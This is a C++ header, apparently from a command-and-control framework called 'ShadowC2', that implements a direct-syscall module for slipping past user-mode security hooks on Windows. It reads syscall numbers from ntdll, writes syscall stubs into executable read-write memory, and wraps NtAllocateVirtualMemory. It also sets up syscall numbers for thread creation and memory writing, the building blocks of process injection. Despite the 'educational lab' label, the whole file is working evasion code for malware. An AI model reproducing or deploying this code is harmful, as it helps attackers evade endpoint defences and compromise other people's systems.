/**
 * ShadowC2 - Direct Syscalls Module
 * Bypass user-mode hooks by calling kernel directly
 * Laboratorio de Ciberseguridad - Uso Educativo
 */

#pragma once
#include <windows.h>
#include <winternl.h>
#include <vector>

namespace DirectSyscalls {

// Syscall numbers (Windows 10 20H2 - adjust for target)
constexpr WORD SYSCALL_NtAllocateVirtualMemory = 0x18;
constexpr WORD SYSCALL_NtProtectVirtualMemory = 0x50;
constexpr WORD SYSCALL_NtCreateThreadEx = 0xC1;
constexpr WORD SYSCALL_NtWriteVirtualMemory = 0x3A;

// Get PEB
inline PPEB GetPEB() {
    #ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
    #else
    return (PPEB)__readfsdword(0x30);
    #endif
}

// Get Syscall Number from ntdll
WORD GetSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    FARPROC func = GetProcAddress(hNtdll, functionName);
    if (!func) return 0;
    
    // Read syscall number from mov eax, imm32
    BYTE* bytes = (BYTE*)func;
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) { // mov r10, rcx
        return *(WORD*)(bytes + 4); // mov eax, syscall_number
    }
    return 0;
}

// Direct syscall stub generator
class SyscallStub {
public:
    std::vector<BYTE> Generate(WORD syscallNumber) {
        std::vector<BYTE> stub;
        
        #ifdef _WIN64
        // mov r10, rcx
        stub.push_back(0x4C);
        stub.push_back(0x8B);
        stub.push_back(0xD1);
        // mov eax, syscallNumber
        stub.push_back(0xB8);
        stub.push_back(syscallNumber & 0xFF);
        stub.push_back((syscallNumber >> 8) & 0xFF);
        stub.push_back(0x00);
        stub.push_back(0x00);
        // syscall
        stub.push_back(0x0F);
        stub.push_back(0x05);
        // ret
        stub.push_back(0xC3);
        #else
        // mov eax, syscallNumber
        stub.push_back(0xB8);
        stub.push_back(syscallNumber & 0xFF);
        stub.push_back((syscallNumber >> 8) & 0xFF);
        stub.push_back(0x00);
        stub.push_back(0x00);
        // mov edx, esp
        stub.push_back(0x8B);
        stub.push_back(0xD4);
        // sysenter
        stub.push_back(0x0F);
        stub.push_back(0x34);
        // ret
        stub.push_back(0xC3);
        #endif
        
        return stub;
    }
};

// Execute direct syscall for NtAllocateVirtualMemory
NTSTATUS SysNtAllocateVirtualMemory(HANDLE processHandle, PVOID* baseAddress, ULONG_PTR zeroBits, PSIZE_T regionSize, ULONG allocationType, ULONG protect) {
    WORD syscallNum = GetSyscallNumber("NtAllocateVirtualMemory");
    if (!syscallNum) return STATUS_UNSUCCESSFUL;
    
    SyscallStub stub;
    auto code = stub.Generate(syscallNum);
    
    // Allocate executable memory for stub
    PVOID execMem = VirtualAlloc(nullptr, code.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return STATUS_UNSUCCESSFUL;
    
    memcpy(execMem, code.data(), code.size());
    
    typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    auto result = ((pNtAllocateVirtualMemory)execMem)(processHandle, baseAddress, zeroBits, regionSize, allocationType, protect);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}

} // namespace DirectSyscalls
